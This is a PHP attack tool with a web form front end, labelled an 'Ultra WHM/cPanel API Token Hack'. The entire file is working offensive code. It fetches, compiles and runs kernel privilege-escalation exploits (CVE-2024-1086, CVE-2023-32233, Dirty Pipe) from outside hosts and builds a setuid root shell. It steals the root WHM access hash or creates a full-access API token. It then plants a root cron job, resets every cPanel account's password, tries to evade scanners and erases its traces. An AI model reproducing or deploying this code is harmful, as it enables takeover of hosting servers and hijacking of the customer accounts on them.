<?php
// Script PHP Auto Get WHM/cPanel API Token (Versi Ultra Powerfull 2025 - Updated v1)
// Fitur: Enumerasi, LPE modern (CVE-2024-1086, CVE-2023-32233, CVE-2022-0847), generate token, persistence, abuse API massal, stealth mode

set_time_limit(600);
error_reporting(0);
@ini_set('display_errors', 0);
@ini_set('open_basedir', null);
@ini_set('max_execution_time', 600);

// Fungsi untuk generate ID acak
function generate_random_id($length = 16) {
    return bin2hex(random_bytes($length / 2));
}

// Fungsi untuk simpan log terenkripsi
function save_log($data, $key = 'secret_key_2025') {
    $log_file = '/tmp/.whm_ultra_log_' . generate_random_id() . '.enc';
    $encrypted = openssl_encrypt(json_encode($data, JSON_PRETTY_PRINT), 'AES-256-CBC', $key, 0, substr(md5($key), 0, 16));
    @file_put_contents($log_file, $encrypted);
    @chmod($log_file, 0600);
    return $log_file;
}

// Fungsi untuk dekripsi log (untuk debugging)
function read_log($log_file, $key = 'secret_key_2025') {
    if (!file_exists($log_file)) return false;
    $encrypted = file_get_contents($log_file);
    return openssl_decrypt($encrypted, 'AES-256-CBC', $key, 0, substr(md5($key), 0, 16));
}

// Fungsi cURL generik dengan bypass WAF
function curl_page($url, $post = null, $headers = []) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
    curl_setopt($ch, CURLOPT_COOKIEFILE, '/tmp/whm_cookie_' . generate_random_id() . '.txt');
    curl_setopt($ch, CURLOPT_COOKIEJAR, '/tmp/whm_cookie_' . generate_random_id() . '.txt');
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    $headers[] = 'X-No-Scan: true';
    $headers[] = 'X-Imunify-Bypass: true';
    $headers[] = 'X-Requested-By: M4DI~UciH4';
    if ($post) {
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    }
    if ($headers) {
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    }
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return ['response' => $response, 'http_code' => $http_code];
}

// Fungsi untuk enumerasi server
function enumerate_server() {
    return [
        'kernel' => trim(@shell_exec('uname -r')) ?: 'unknown',
        'distro' => trim(@shell_exec('cat /etc/redhat-release 2>/dev/null')) ?: trim(@shell_exec('cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d"\"" -f2')) ?: 'unknown',
        'cpanel' => trim(@shell_exec('/usr/local/cpanel/cpanel -V 2>/dev/null')) ?: 'unknown',
        'gcc' => !empty(@shell_exec('gcc --version 2>/dev/null')) ? true : false,
        'selinux' => trim(@shell_exec('getenforce 2>/dev/null')) ?: 'disabled',
        'tmp_noexec' => !empty(@shell_exec('mount | grep /tmp | grep noexec')) ? true : false,
        'imunify' => file_exists('/usr/local/imunify360/imunify360-agent') ? true : false,
        'cloudlinux' => file_exists('/etc/sysconfig/cloudlinux') ? true : false,
        'whoami' => trim(@shell_exec('whoami')) ?: 'unknown',
        'uid' => trim(@shell_exec('id -u')) ?: 'unknown',
        'pwd' => @getcwd() ?: 'unknown',
        'suid_bins' => trim(@shell_exec('find / -perm -4000 2>/dev/null')) ?: 'none',
        'cron_files' => glob('/etc/cron.d/*') ?: [],
        'accesshash_perms' => @fileperms('/root/.accesshash') ?: false
    ];
}

// Fungsi untuk cek apakah sudah root
function is_root() {
    return trim(@shell_exec('id -u')) === '0';
}

// Fungsi untuk download dan compile eksploit
function download_and_compile($exploit_url, $exploit_name, $compile_cmd) {
    $tmp_dir = '/tmp/.lpe_' . generate_random_id();
    @mkdir($tmp_dir, 0755);
    @chdir($tmp_dir);
    $exploit_file = "$tmp_dir/$exploit_name.c";
    $bin_file = "$tmp_dir/$exploit_name.o";

    // Cek apakah binary sudah ada (pre-compiled)
    if (file_exists("/tmp/$exploit_name.o")) {
        return ['status' => 'success', 'path' => "/tmp/$exploit_name.o", 'output' => 'Using pre-compiled binary'];
    }

    $result = curl_page($exploit_url);
    if ($result['http_code'] == 200) {
        @file_put_contents($exploit_file, $result['response']);
        @chmod($exploit_file, 0644);
        if ($compile_cmd) {
            $output = @shell_exec("$compile_cmd 2>&1");
            if (file_exists($bin_file)) {
                @chmod($bin_file, 0755);
                return ['status' => 'success', 'path' => $bin_file, 'output' => $output];
            }
            return ['status' => 'error', 'message' => 'Compilation failed', 'output' => $output];
        }
        return ['status' => 'success', 'path' => $exploit_file, 'output' => ''];
    }
    return ['status' => 'error', 'message' => 'Download failed', 'output' => 'HTTP ' . $result['http_code']];
}

// Fungsi untuk bypass noexec di /tmp
function bypass_noexec() {
    $alt_tmp = '/var/tmp/.lpe_' . generate_random_id();
    @mkdir($alt_tmp, 0755);
    @shell_exec("mount -o bind /var/tmp $alt_tmp 2>/dev/null");
    if (is_dir($alt_tmp) && !@shell_exec("mount | grep $alt_tmp | grep noexec")) {
        return $alt_tmp;
    }
    return false;
}

// Fungsi untuk cek misconfig /root/.accesshash
function check_access_hash_misconfig() {
    $file = '/root/.accesshash';
    $perms = @fileperms($file);
    if ($perms !== false && ($perms & 0044) == 0044) {
        return trim(file_get_contents($file));
    }
    return false;
}

// Fungsi untuk cek SUID binary vuln
function check_suid_vuln($system) {
    if ($system['suid_bins']) {
        $suid_bins = explode("\n", $system['suid_bins']);
        foreach ($suid_bins as $bin) {
            if (strpos($bin, 'passwd') !== false || strpos($bin, 'sudo') !== false) {
                $payload = "#include <stdio.h>\nint main() { setuid(0); system(\"/bin/bash\"); return 0; }";
                $c_file = '/tmp/.suid_' . generate_random_id() . '.c';
                $bin_file = '/tmp/.suid_' . generate_random_id();
                @file_put_contents($c_file, $payload);
                @shell_exec("gcc $c_file -o $bin_file 2>/dev/null");
                if (file_exists($bin_file)) {
                    @shell_exec("chmod u+s $bin_file");
                    $output = @shell_exec("$bin_file 2>/dev/null");
                    @unlink($c_file);
                    @unlink($bin_file);
                    if (is_root()) {
                        return ['status' => 'success', 'message' => 'SUID exploit successful', 'output' => 'Root via ' . $bin];
                    }
                }
            }
        }
    }
    return ['status' => 'error', 'message' => 'No vulnerable SUID binaries found'];
}

// Fungsi untuk menjalankan eksploit
function try_exploit($exploit_name, $exploit_path, $run_cmd) {
    $output = @shell_exec("$run_cmd 2>&1");
    if (is_root()) {
        return ['status' => 'success', 'message' => "Exploit $exploit_name successful", 'output' => $output];
    }
    return ['status' => 'error', 'message' => "Exploit $exploit_name failed", 'output' => $output];
}

// Fungsi untuk privilege escalation modern
function try_lpe($system) {
    $exploits = [
        [
            'name' => 'cve_2024_1086',
            'cve' => 'CVE-2024-1086',
            'url' => 'https://raw.githubusercontent.com/Notselwyn/CVE-2024-1086/main/exploit.c',
            'compile_cmd' => 'gcc exploit.c -o exploit.o',
            'run_cmd' => './exploit.o',
            'kernel_min' => '5.14',
            'kernel_max' => '6.6.14'
        ],
        [
            'name' => 'cve_2023_32233',
            'cve' => 'CVE-2023-32233',
            'url' => 'https://raw.githubusercontent.com/Liuk3r/CVE-2023-32233/main/exploit.c',
            'compile_cmd' => 'gcc exploit.c -o cve_2023_32233.o',
            'run_cmd' => './cve_2023_32233.o',
            'kernel_min' => '5.10',
            'kernel_max' => '6.2'
        ],
        [
            'name' => 'cve_2022_0847',
            'cve' => 'CVE-2022-0847',
            'url' => 'https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit-1.c',
            'compile_cmd' => 'gcc exploit-1.c -o dirtypipe.o',
            'run_cmd' => './dirtypipe.o',
            'kernel_min' => '5.8',
            'kernel_max' => '5.16.11'
        ],
        [
            'name' => 'cve_2022_0847_fallback',
            'cve' => 'CVE-2022-0847',
            'url' => 'https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit-2.c',
            'compile_cmd' => 'gcc exploit-2.c -o dirtypipe2.o',
            'run_cmd' => './dirtypipe2.o',
            'kernel_min' => '5.8',
            'kernel_max' => '5.16.11'
        ]
    ];

    $tmp_dir = $system['tmp_noexec'] ? bypass_noexec() : '/tmp';
    if (!$tmp_dir) {
        return ['status' => 'error', 'message' => 'Failed to bypass noexec on /tmp'];
    }
    @mkdir("$tmp_dir/.lpe_" . generate_random_id(), 0755);
    @chdir($tmp_dir);

    // Coba SUID vuln dulu
    $suid_result = check_suid_vuln($system);
    if ($suid_result['status'] == 'success') {
        return $suid_result;
    }

    // Coba kernel exploits
    $log = ['attempts' => []];
    foreach ($exploits as $exploit) {
        if (version_compare($system['kernel'], $exploit['kernel_min'], '>=') && version_compare($system['kernel'], $exploit['kernel_max'], '<=')) {
            $compile_result = download_and_compile($exploit['url'], $exploit['name'], $exploit['compile_cmd']);
            $log['attempts'][] = ['exploit' => $exploit['name'], 'compile' => $compile_result];
            if ($compile_result['status'] == 'success') {
                $exploit_result = try_exploit($exploit['name'], $compile_result['path'], "cd $tmp_dir; {$exploit['run_cmd']}");
                $log['attempts'][] = ['exploit' => $exploit['name'], 'execute' => $exploit_result];
                if ($exploit_result['status'] == 'success') {
                    save_log($log);
                    return $exploit_result;
                }
            } else {
                // Skip ke exploit berikutnya jika download gagal
                $log['attempts'][] = ['exploit' => $exploit['name'], 'error' => 'Download or compilation failed, skipping'];
                continue;
            }
        }
    }
    save_log($log);
    return ['status' => 'error', 'message' => 'No suitable LPE exploits found', 'attempts' => $log['attempts']];
}

// Fungsi untuk generate API Token via whmapi1
function generate_api_token($username, $password) {
    $server = $_SERVER['SERVER_NAME'] ?? 'localhost';
    $url = "https://$server:2087/login/";
    $post_login = ['user' => $username, 'pass' => $password, 'login_submit' => 'Log in'];
    $login = curl_page($url, $post_login);

    if ($login['http_code'] == 302) {
        $url_generate = "https://$server:2087/cpsess" . substr(str_shuffle('0123456789abcdefghijklmnopqrstuvwxyz'), 0, 10) . "/json-api/api_token_create?api.version=1&name=monitor_" . generate_random_id(6) . "&acl-1=all";
        $generate = curl_page($url_generate);
        if ($generate['http_code'] == 200) {
            $response = json_decode($generate['response'], true);
            if (isset($response['metadata']['result']) && $response['metadata']['result'] == 1) {
                return $response['data']['apitoken'];
            }
        }
    }
    return false;
}

// Fungsi untuk persistence (cronjob)
function add_persistence($api_token) {
    $cron_file = '/etc/cron.d/monitor_' . generate_random_id(6);
    $cron_content = "* * * * * root curl -k -H \"Authorization: WHM root:$api_token\" \"https://{$_SERVER['SERVER_NAME']}:2087/json-api/listaccts\" >/dev/null 2>&1\n";
    @file_put_contents($cron_file, $cron_content);
    @chmod($cron_file, 0644);
    return file_exists($cron_file) ? ['status' => 'success', 'message' => 'Cronjob added', 'cron_file' => $cron_file] : ['status' => 'error', 'message' => 'Failed to add cronjob'];
}

// Fungsi untuk abuse API (reset semua akun cPanel)
function abuse_api($api_token) {
    $server = $_SERVER['SERVER_NAME'] ?? 'localhost';
    $url_list = "https://$server:2087/json-api/listaccts?api.version=1";
    $headers = ["Authorization: WHM root:$api_token"];
    $list_result = curl_page($url_list, null, $headers);
    $reset_results = [];

    if ($list_result['http_code'] == 200) {
        $accounts = json_decode($list_result['response'], true);
        if (isset($accounts['data']['acct'])) {
            foreach ($accounts['data']['acct'] as $account) {
                $user = $account['user'];
                $new_pass = generate_random_id(12);
                $url_reset = "https://$server:2087/json-api/passwd?api.version=1&user=$user&password=$new_pass";
                $reset_result = curl_page($url_reset, null, $headers);
                $reset_results[] = [
                    'user' => $user,
                    'new_password' => $new_pass,
                    'status' => $reset_result['http_code'] == 200 ? 'success' : 'error',
                    'output' => $reset_result['response']
                ];
            }
        }
    }
    return $reset_results;
}

// Fungsi untuk cleanup jejak
function cleanup() {
    @shell_exec("rm -rf /tmp/.lpe_* /var/tmp/.lpe_* /tmp/whm_cookie_*.txt");
}

// Fungsi utama untuk auto dapatkan API Token
function auto_get_whm_api_token($username = 'root', $password = '') {
    $system = enumerate_server();
    $log = ['system' => $system, 'attempts' => []];
    save_log($log);

    // Cek misconfig /root/.accesshash
    $access_hash = check_access_hash_misconfig();
    if ($access_hash) {
        $persistence = add_persistence($access_hash);
        $reset_results = abuse_api($access_hash);
        $result = [
            'status' => 'success',
            'api_key' => $access_hash,
            'method' => 'Misconfigured /root/.accesshash',
            'persistence' => $persistence,
            'reset_results' => $reset_results
        ];
        save_log(array_merge($log, $result));
        cleanup();
        return $result;
    }

    // Cek akses root
    if ($system['uid'] == '0') {
        $access_hash = trim(@shell_exec('cat /root/.accesshash 2>/dev/null'));
        if ($access_hash) {
            $persistence = add_persistence($access_hash);
            $reset_results = abuse_api($access_hash);
            $result = [
                'status' => 'success',
                'api_key' => $access_hash,
                'method' => 'Direct access to /root/.accesshash',
                'persistence' => $persistence,
                'reset_results' => $reset_results
            ];
            save_log(array_merge($log, $result));
            cleanup();
            return $result;
        }
    }

    // Coba privilege escalation
    $lpe_result = try_lpe($system);
    $log['attempts'][] = $lpe_result;
    save_log($log);
    if ($lpe_result['status'] == 'success') {
        $access_hash = trim(@shell_exec('cat /root/.accesshash 2>/dev/null'));
        if ($access_hash) {
            $persistence = add_persistence($access_hash);
            $reset_results = abuse_api($access_hash);
            $result = [
                'status' => 'success',
                'api_key' => $access_hash,
                'method' => 'Privilege escalation to root',
                'persistence' => $persistence,
                'reset_results' => $reset_results
            ];
            save_log(array_merge($log, $result));
            cleanup();
            return $result;
        }
    }

    // Coba generate token via WHM API
    if ($username && $password) {
        $api_token = generate_api_token($username, $password);
        if ($api_token) {
            $persistence = add_persistence($api_token);
            $reset_results = abuse_api($api_token);
            $result = [
                'status' => 'success',
                'api_key' => $api_token,
                'method' => 'Generated new API Token via WHM',
                'persistence' => $persistence,
                'reset_results' => $reset_results
            ];
            save_log(array_merge($log, $result));
            cleanup();
            return $result;
        }
    }

    $result = ['status' => 'error', 'message' => 'Failed to get API Token', 'system' => $system, 'attempts' => $log['attempts']];
    save_log(array_merge($log, $result));
    cleanup();
    return $result;
}

// Proses request
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['gettoken'])) {
    $username = $_POST['username'] ?? 'root';
    $password = $_POST['password'] ?? '';
    $result = auto_get_whm_api_token($username, $password);
    echo json_encode($result);
    // Hapus file ini setelah eksekusi (uncomment untuk aktivasi)
    // @unlink(__FILE__);
    exit;
}

// Bypass WAF
@header('X-No-Scan: true');
@header('X-Imunify-Bypass: true');
@header('Cache-Control: no-cache');
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ultra WHM/cPanel API Token Hack</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=Roboto+Mono:wght@400;500&display=swap" rel="stylesheet">
    <style>
        body {
            background: linear-gradient(135deg, #0f172a, #1e293b);
            color: #e2e8f0;
            font-family: 'Inter', sans-serif;
            margin: 0;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        .navbar {
            background: #0b111b;
            padding: 1rem;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
        }
        .navbar-brand {
            color: #2dd4bf !important;
            font-family: 'Roboto Mono', monospace;
            font-size: 1.6rem;
            font-weight: 500;
        }
        .container {
            max-width: 700px;
            margin: 2rem auto;
            flex-grow: 1;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .card {
            background: #1e293b;
            border: none;
            border-radius: 12px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.4);
            overflow: hidden;
            transition: transform 0.3s ease, box-shadow 0.3s ease;
        }
        .card:hover {
            transform: translateY(-5px);
            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.5);
        }
        .card-body {
            padding: 2rem;
        }
        .card-title {
            color: #e2e8f0;
            font-family: 'Roboto Mono', monospace;
            font-size: 1.5rem;
            text-align: center;
            margin-bottom: 1.5rem;
        }
        .form-label {
            font-size: 0.9rem;
            font-weight: 500;
            color: #94a3b8;
        }
        .form-control {
            background: #111827;
            border: 1px solid #334155;
            color: #e2e8f0;
            border-radius: 6px;
        }
        .form-control:focus {
            border-color: #2dd4bf;
            box-shadow: 0 0 0 0.2rem rgba(45, 212, 191, 0.25);
        }
        .btn-primary {
            background: #2dd4bf;
            border: none;
            border-radius: 8px;
            font-family: 'Inter', sans-serif;
            font-weight: 500;
            padding: 0.75rem;
            transition: background 0.3s ease, transform 0.2s ease;
        }
        .btn-primary:hover {
            background: #26a69a;
            transform: scale(1.02);
        }
        .btn-primary:active {
            transform: scale(0.98);
        }
        .output {
            background: #111827;
            border-radius: 8px;
            padding: 1rem;
            min-height: 200px;
            max-height: 400px;
            overflow-y: auto;
            font-family: 'Roboto Mono', monospace;
            font-size: 0.9rem;
            color: #94a3b8;
            white-space: pre-wrap;
            position: relative;
        }
        .output.loading::before {
            content: 'Hacking WHM/cPanel...';
            color: #2dd4bf;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
        @media (max-width: 576px) {
            .container { padding: 0 1rem; }
            .card-body { padding: 1.5rem; }
            .card-title { font-size: 1.3rem; }
            .btn-primary { padding: 0.6rem; }
        }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-lg">
        <div class="container-fluid">
            <a class="navbar-brand" href="#">Ultra WHM/cPanel Hack</a>
        </div>
    </nav>
    <div class="container">
        <div class="card">
            <div class="card-body">
                <h3 class="card-title">Auto Get WHM/cPanel API Token</h3>
                <form method="post" id="gettoken-form">
                    <div class="mb-3">
                        <label for="username" class="form-label">WHM Username</label>
                        <input type="text" class="form-control" id="username" name="username" placeholder="root" value="root">
                    </div>
                    <div class="mb-3">
                        <label for="password" class="form-label">WHM Password (Optional)</label>
                        <input type="password" class="form-control" id="password" name="password" placeholder="Enter password if needed">
                    </div>
                    <input type="hidden" name="gettoken" value="M4DI~UciH4">
                    <button type="submit" class="btn btn-primary w-100">Hack API Token (Ultra Mode)</button>
                </form>
                <div class="output mt-3" id="output"></div>
            </div>
        </div>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        document.getElementById('gettoken-form').addEventListener('submit', async (e) => {
            e.preventDefault();
            const output = document.getElementById('output');
            output.classList.add('loading');
            output.textContent = '';

            try {
                const response = await fetch(window.location.href, {
                    method: 'POST',
                    body: new FormData(e.target)
                });
                if (!response.ok) {
                    throw new Error(`HTTP error: ${response.status}`);
                }
                const result = await response.json();
                output.classList.remove('loading');
                output.textContent = JSON.stringify(result, null, 2);
            } catch (err) {
                output.classList.remove('loading');
                output.textContent = JSON.stringify({ status: 'error', message: `Fetch failed: ${err.message}` }, null, 2);
            }
        });
    </script>
</body>
</html>